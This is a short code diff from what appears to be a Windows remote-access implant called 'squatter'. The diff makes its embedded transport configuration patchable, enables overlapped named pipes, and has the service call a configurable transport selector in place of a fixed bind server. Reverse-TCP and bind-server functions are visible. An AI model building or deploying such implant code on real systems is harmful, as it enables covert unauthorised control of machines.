@@ -57,7 +57,7 @@ __attribute__((used)) const sq_hovel_build_info squatter_build_info = {
     0x00000007u,
 };
 
-__attribute__((used)) const sq_hovel_config squatter_transport_config = {
+__attribute__((used)) sq_hovel_config squatter_transport_config = {
     {'S', 'Q', 'C', 'F', 'G', '0', '0', '1'},
     SQ_HOVEL_TRANSPORT_NONE,
     {127u, 0u, 0u, 1u},
@@ -170,8 +170,9 @@ static DWORD WINAPI on_service_control(DWORD control, DWORD event_type, LPVOID e
 
 static HANDLE create_pipe_instance(const wchar_t *pipe_name)
 {
-        return CreateNamedPipeW(pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
-                                PIPE_UNLIMITED_INSTANCES, 65536, 65536, 0, NULL);
+        return CreateNamedPipeW(pipe_name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
+                                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 65536, 65536,
+                                0, NULL);
 }
 
 static SOCKET connect_reverse_tcp(const sq_hovel_config *config)
@@ -413,6 +414,8 @@ static const wchar_t *configured_port(const sq_hovel_config *config, wchar_t por
         return L"9100";
 }
 
+static int run_configured_transport(const wchar_t *port, const sq_module_table *table);
+
 typedef struct sq_service_context
 {
         wchar_t *service_name;
@@ -443,7 +446,7 @@ static void WINAPI service_main(DWORD argc, LPWSTR *argv)
                 return;
         }
         report_service_status(SERVICE_RUNNING, NO_ERROR, 0);
-        rc = run_tcp_bind_server(g_service_context.port, g_service_context.table);
+        rc = run_configured_transport(g_service_context.port, g_service_context.table);
         (void)WSACleanup();
         report_service_status(SERVICE_STOPPED, (rc == 0) ? NO_ERROR : ERROR_SERVICE_SPECIFIC_ERROR, 0);
 }
